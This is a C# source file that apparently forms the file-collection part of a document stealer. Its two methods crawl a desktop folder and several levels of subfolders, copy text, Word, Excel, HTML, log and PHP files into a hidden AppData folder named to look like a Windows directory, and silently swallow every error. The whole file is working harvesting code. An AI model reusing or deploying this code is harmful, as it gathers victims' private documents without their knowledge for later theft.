
using System;
using System.IO;

namespace d3sktop
{
    class desktop
    {
        public static void desktop_text(string path)
        {
            try
            {
                if (Directory.Exists(path))
                {
                    string[] dirFiles = Directory.GetFiles(path); // getting names of all files in desktop
                    Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Desktop"); // creating new dir in our directory
                    for (int i = 0; i < dirFiles.Length; i++)
                    {
                        FileInfo fileinf = new FileInfo(dirFiles[i]);
                        if (fileinf.Extension == ".doc" || fileinf.Extension == ".txt" || fileinf.Extension == ".text" || fileinf.Extension == ".log" || fileinf.Extension == ".html" || fileinf.Extension == ".htm" || fileinf.Extension == ".xls") // checking file extension, if txt, doc etc
                        {
                            fileinf.CopyTo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Desktop/" + fileinf.Name); // Copying this file to our directory
                        }
                    }
                }
            }
            catch
            {
            }

        }
        public static void dekstop_dir(string path)
        {
            try
            {
                string[] second = Directory.GetDirectories(path); // getting desktop directories
                for (int i = 0; i < second.Length; i++)
                {
                    string[] third = Directory.GetDirectories(second[i]); // Getting directories in second-level directory
                    if (Directory.Exists(second[i]))
                    {
                        string[] dirFiles = Directory.GetFiles(second[i]); // getting files in second dir

                        for (int g = 0; g < dirFiles.Length; g++) // SAME EVERTYWHERE
                        {
                            FileInfo fileinf = new FileInfo(dirFiles[g]);
                            if (fileinf.Extension == ".doc" || fileinf.Extension == ".txt" || fileinf.Extension == ".text" || fileinf.Extension == ".log" || fileinf.Extension == ".html" || fileinf.Extension == ".htm" || fileinf.Extension == ".xls" || fileinf.Extension == ".docx" || fileinf.Extension == ".php")
                            {
                                fileinf.CopyTo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Desktop/" + fileinf.Name);
                            }
                        }
                    }
                    for (int y = 0; y < third.Length; y++)
                    {
                        string[] forth = Directory.GetDirectories(third[y]);
                        if (Directory.Exists(third[y]))
                        {
                            string[] dirFiles = Directory.GetFiles(third[y]);
                            for (int g = 0; g < dirFiles.Length; g++)
                            {
                                FileInfo fileinf = new FileInfo(dirFiles[g]);
                                if (fileinf.Extension == ".doc" || fileinf.Extension == ".txt" || fileinf.Extension == ".text" || fileinf.Extension == ".log" || fileinf.Extension == ".html" || fileinf.Extension == ".htm" || fileinf.Extension == ".xls")
                                {
                                    fileinf.CopyTo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Desktop/" + fileinf.Name);
                                }
                            }
                        }


                        for (int x = 0; x < forth.Length; x++)
                        {
                            string[] fifth = Directory.GetDirectories(forth[x]);

                            if (Directory.Exists(forth[x]))
                            {
                                string[] dirFiles = Directory.GetFiles(forth[x]);
                                for (int g = 0; g < dirFiles.Length; g++)
                                {
                                    FileInfo fileinf = new FileInfo(dirFiles[g]);
                                    if (fileinf.Extension == ".doc" || fileinf.Extension == ".txt" || fileinf.Extension == ".text" || fileinf.Extension == ".log" || fileinf.Extension == ".html" || fileinf.Extension == ".htm" || fileinf.Extension == ".xls")
                                    {
                                        fileinf.CopyTo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Desktop/" + fileinf.Name);
                                    }
                                }
                            }
                            for (int w = 0; w < fifth.Length; w++)
                            {
                                string[] sixth = Directory.GetDirectories(fifth[w]);


                                if (Directory.Exists(fifth[w]))
                                {
                                    string[] dirFiles = Directory.GetFiles(fifth[w]);
                                    for (int g = 0; g < dirFiles.Length; g++)
                                    {
                                        FileInfo fileinf = new FileInfo(dirFiles[g]);
                                        if (fileinf.Extension == ".doc" || fileinf.Extension == ".txt" || fileinf.Extension == ".text" || fileinf.Extension == ".log" || fileinf.Extension == ".html" || fileinf.Extension == ".htm" || fileinf.Extension == ".xls")
                                        {
                                            fileinf.CopyTo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Desktop/" + fileinf.Name);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch
            {
            }
        }
    }
}
